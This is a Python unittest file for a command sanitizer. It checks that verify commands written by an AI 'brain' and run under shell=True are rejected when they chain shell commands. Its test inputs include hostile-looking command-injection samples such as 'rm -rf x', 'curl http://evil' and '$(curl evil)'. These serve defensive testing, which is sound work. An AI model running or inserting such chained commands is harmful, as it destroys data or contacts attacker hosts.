"""A brain-authored verify cmd runs under shell=True. sanitizeVerify must drop a cmd with
shell-chaining metacharacters (so it falls back to 'executor exited 0') unless it is a validated
`python -c` shape whose closing quote ends the command."""
import unittest

from agents import verifier


class TestVerifyShellSafety(unittest.TestCase):
    def _san(self, cmd):
        return verifier.sanitizeVerify({"cmd": cmd, "expect": "exit_zero"})

    def test_chained_command_is_dropped(self):
        self.assertIsNone(self._san("pytest && rm -rf x"))
        self.assertIsNone(self._san("node check.js; curl http://evil"))
        self.assertIsNone(self._san("pytest | tee out"))
        self.assertIsNone(self._san("echo `whoami`"))
        self.assertIsNone(self._san("python run.py $(curl evil)"))

    def test_clean_commands_pass(self):
        self.assertIsNotNone(self._san("pytest tests/"))
        self.assertIsNotNone(self._san("python script.py"))

    def test_python_dash_c_with_pipe_in_body_is_exempt(self):
        # the pipe is inside the python source (bitwise-or), not a shell pipe; the quote ends the cmd
        out = self._san('python -c "print(1 | 2)"')
        self.assertIsNotNone(out)

    def test_python_dash_c_with_trailing_shell_content_is_dropped(self):
        # BUG-001/BUG-006: a `python -c "safe_code" && evil_cmd` shape must be dropped, not
        # exempted as a validated python -c body -- the closing quote does NOT end the command
        # here, so the exemption (AST-validated body, closing quote ends the cmd) must not apply.
        self.assertIsNone(self._san('python -c "print(1)" && evil_cmd'))
        self.assertIsNone(self._san('python -c "print(1)"; rm -rf x'))
        self.assertIsNone(self._san('python -c "print(1)" | tee out'))


if __name__ == "__main__":
    unittest.main()
